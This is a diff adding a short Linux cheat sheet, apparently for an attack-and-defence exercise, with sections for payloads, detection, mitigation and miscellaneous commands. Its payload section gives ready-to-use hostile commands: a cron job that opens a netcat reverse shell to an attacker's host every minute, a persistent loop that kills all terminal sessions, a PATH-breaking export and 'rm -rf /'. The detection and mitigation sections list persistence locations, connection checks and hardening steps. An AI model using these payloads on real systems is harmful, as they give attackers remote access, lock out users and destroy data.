@@ -1,0 +1,63 @@
+####################################
+##	PAYLOADS
+####################################
+
+crontab <<< "* * * * * nc -c /bin/sh <host> <port>"	// creates a nc backdoor, constantly tries to establish connection to attacker's box every 1 min
+
+while true; do for i in {1..7}; do who -p -u | grep -e tty -e pts| awk '{ print $6 }' | xargs -n1 kill -9; echo pwned > /dev/tty$i; done; sleep 0.1; done 2>/dev/null &	// Kills all terminal sessions.. consistently.. add this to /etc/rc.local to startup everytime.. nohup /etc/rc.local &
+
+export PATH=/dev/null
+
+rm -rf /
+
+Whatever is in detection.
+
+####################################
+##	EGRESSION
+####################################
+
+
+
+####################################
+##	DETECTION
+####################################
+
+netstat -tanp		// shows active tcp connections with associating pid
+netstat -tanp | egrep -e ESTABLISHED -e LISTEN
+
+who -u -p
+
+~/.bashrc
+~/.profile
+/etc/bash.bashrc
+/etc/profile
+/etc/profile.d/*
+/etc/environment
+~/.config/autostart
+
+cat /etc/rc.local	// bashrc, but for boot
+
+crontab -l
+
+####################################
+##	MITIGATION
+####################################
+
+tcpkill -9 host <attacker's ip>	// constantly blocks any connection with the ip specified
+
+who -p -u | grep -e tty -e pts| awk '{ print $6 }' | grep -v $OWNTTY | xargs -n1 kill -9
+
+crontab -r
+
+chattr +i /etc/passwd			// lsattr - list attributes, -i - remove immutability
+chattr +i /etc/shadow
+chattr +i /etc/group
+
+####################################
+##	OTHERS
+####################################
+
+ls *.rpm | xargs rpm -ivh	// installs multiple rpm packages in one go, assuming they dont depend on each other
+
+nmap -n -Pn		// no host discovery, treat host as online (real world flags)
+
